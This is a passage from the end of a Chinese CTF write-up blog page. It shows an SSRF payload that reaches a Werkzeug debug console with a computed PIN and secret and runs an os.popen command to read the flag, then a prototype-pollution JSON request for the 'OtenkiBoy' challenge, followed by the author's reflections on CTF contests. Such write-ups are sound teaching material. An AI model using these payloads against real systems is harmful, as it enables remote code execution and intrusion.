</span></span></code></pre></td></tr></table></div></div><p>得到<code>107-667-381</code>和<code>__wzd03fbc8a0ce3cfdab3d2e=1754745570|65ee6ca6bbab</code></p><p>访问console来获得<code>secret</code>和<code>frm</code>，没有报错<code>frm</code>默认为0</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?url=http://localhost:1314/console&amp;lolita[]=
</span></span><span class=line><span class=cl>JbjRr8rMsX31cclteJRo
</span></span></code></pre></td></tr></table></div></div><p>再来ssrf这里</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?lolita[]=Cookie:__wzd03fbc8a0ce3cfdab3d2e=1754745570|65ee6ca6bbab&amp;url=http://127.0.0.1:1314/console?__debugger__=yes&amp;pin=107-667-381&amp;cmd=__import__(&#34;os&#34;).popen(&#34;cat%2B/flag&#34;).read()&amp;frm=0&amp;s=JbjRr8rMsX31cclteJRo
</span></span></code></pre></td></tr></table></div></div><h2 id=otenkiboy>OtenkiBoy</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/submit</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>88e6e9a7-4df0-4f84-9c6c-623688a9f061.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>176</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>*/*</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://88e6e9a7-4df0-4f84-9c6c-623688a9f061.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://88e6e9a7-4df0-4f84-9c6c-623688a9f061.node5.buuoj.cn:81/</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;contact&#34;</span><span class=p>:</span><span class=s2>&#34;a&#34;</span><span class=p>,</span> <span class=nt>&#34;reason&#34;</span><span class=p>:</span><span class=s2>&#34;a&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;constructor&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;prototype&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;format&#34;</span><span class=p>:</span> <span class=s2>&#34;yy19-MM-ddTHH:mm:ss.fffZ&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;baseDate&#34;</span><span class=p>:</span><span class=s2>&#34;aaa&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;fff&#34;</span><span class=p>:</span> <span class=s2>&#34;bbb&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=聊聊>聊聊</h2><p>你居然看到了这里？突然想起来去年我以为太菜而晚上失眠（十二点多才睡着，虽然现在已经是家常），太菜主要是两个点，第一个是nepCTF，我已经学了快半年了当时，还是做不出来什么题，甚至说自己看代码都难得很，还有一个就是出题，newstar这类的新生赛，我是一个邀请都没有。没人知道我，更没人会记得我。</p><p>于是我就开始骚扰我的师父，他工作强度还是挺高的，我一个人发了二十多条信息，叽里呱啦的，但是他一条也没回（心想最后的依靠都没了），过了一分钟，“明年你如果想出题的话，我可以帮你搞定这件事”。这次骚扰的原因，其实还是自尊心作祟，因为当时的出题人web里面真不是特别厉害，我觉得我应该是比他们要略微强一丢丢的，但是我却没有这样的机会www。</p><p>忽而都已经过去一年了，之前差点爆零的nepCTF也是能做最后一题了，而且心态变化，现在你可能让我去出这种新生赛的题我都不大愿意了（base可以），年初和去年末很多新生赛，mmp，都是打着新生赛的旗号，展示自己的，有些东西你能遇到我吃，就拿某GAME和昨年五个学校联合（黑龙江理工在内，名字忘了），主要吐槽两个题，一个比赛一个（不偏爱哈），一个是某NDAY的复现，利用条件极其苛刻，另一个是http，里面的http头我一个都不知道，真就一点都没见过。</p><p>这两天花时间做了做23年的newstar，发现我竟然还是能从新生赛里面学到东西，令我形象深刻更是。但是年初和去年末这段时间的新生赛，我基本就没学到什么东西了，更何况是去年的我，甚至你问我做过的题，我可能一点形象都没有。</p><p>说到最后其实就是想让看到这里的师傅，出题的师傅尽量不要套，更不要脑洞，就分享自己最近研究的姿势就可以了，特别是别随便甩个冷门NDAY（这不傻*吗）。最近会有一个LILCTF，里面的师傅水平都和我差不多、更好，既然是打了“初心”的旗号的，我觉得可以冲（我要和suer参加国际赛就不来了），预祝LILCTF顺利举办。</p><p>还有一个CTF就是SU Junior，我看了文档的，简直就是分站赛级别的精华题目，可别错过嗷，暂时还有定档，肯定是在九、十月！</p></section><footer class=article-footer><section class=article-tags><a href=/tags/php/>Php</a>
<a href=/tags/ssti/>Ssti</a>
<a href=/tags/phar/>Phar</a>
<a href=/tags/nodejs/>Nodejs</a>
<a href=/tags/mysql/>Mysql</a></section><section class=article-reward style="margin:var(--card-padding)0 0;display:block;text-transform:none;text-align:center"><h3 style="margin:0 0 .75rem;font-size:1.1rem">赞赏支持</h3><figure style="margin:0 auto"><img src=/wechat.png alt loading=lazy style="width:min(320px,90vw);height:auto;border:1px solid #eee;border-radius:12px;background:#fff;padding:6px;box-shadow:0 2px 8px rgba(0,0,0,4%)"><figcaption style=font-size:.9rem;color:#666;margin-top:.5rem></figcaption></figure></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/dest0g3-520-welcome-match/><div class=article-details><h2 class=article-title>Dest0g3 520迎新赛</h2></div></a></article><article><a href=/p/gyctf2020/><div class=article-details><h2 class=article-title>GYCTF2020</h2></div></a></article><article><a href=/p/wustctf2020/><div class=article-details><h2 class=article-title>WUSTCTF2020</h2></div></a></article><article><a href=/p/gxyctf2019/><div class=article-details><h2 class=article-title>GXYCTF2019</h2></div></a></article><article><a href=/p/ctfshow-internal-competition/><div class=article-details><h2 class=article-title>ctfshow内部赛</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2024 -
2025 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>